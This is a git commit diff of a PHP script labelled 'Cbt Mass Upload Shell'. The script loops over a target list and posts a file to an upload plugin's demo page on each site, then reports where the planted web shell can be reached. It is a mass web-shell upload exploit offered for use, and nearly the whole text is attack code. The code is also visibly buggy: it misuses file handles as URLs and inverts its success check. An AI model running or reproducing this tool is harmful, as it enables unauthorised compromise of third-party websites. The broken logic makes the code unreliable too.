0ea836935bc4d47b4db2f36b8b1d6fad99de3f2c
MarsHallSec <47811548+MarsHallGans@users.noreply.github.com>
2020-01-25 03:04:09 +0000

    Update cbt.php

--- cbt.php
+++ cbt.php
@@ -4,7 +4,7 @@
   echo "#  Cbt Mass Upload Shell  #\n";
   echo "#   Created By MarsHall   #\n";
   echo "###########################\n";
-  $file = file_get_contents(target.txt);
+  $file = 'target.txt';
   $file2 = fopen($file, "rb");
   
   
@@ -13,17 +13,19 @@ $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "$file2/plugins/uploadfile/demo/demo.html");
 curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36');
 curl_setopt($ch, CURLOPT_POST, true); 
-curl_setopt($ch, CURLOPT_POSTFIELDS, array('fileToUpload'=>"@$uploadfile2"));
+curl_setopt($ch, CURLOPT_POSTFIELDS, array('fileToUpload'=>"@$uploadfile"));
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $postResult = curl_exec($ch);
 $gagal = curl_error($ch);
 curl_close($ch);
     
-for($xy=0;$xy<count($subdo);$xy++){
+while(!feof($file2)){
+  $postResult = fgets($file2);
+
     if($postResult){
    echo "Target Not Vuln  $gagal\n";
    }else{
-   echo "Target Vuln : $target[$xy]\nAkses Shell : ../demo/uploads/upload.php\n";
+   echo "Target Vuln : $file2\nAkses Shell : ../demo/uploads/upload.php\n";
    }
-}
+  } 
 ?>
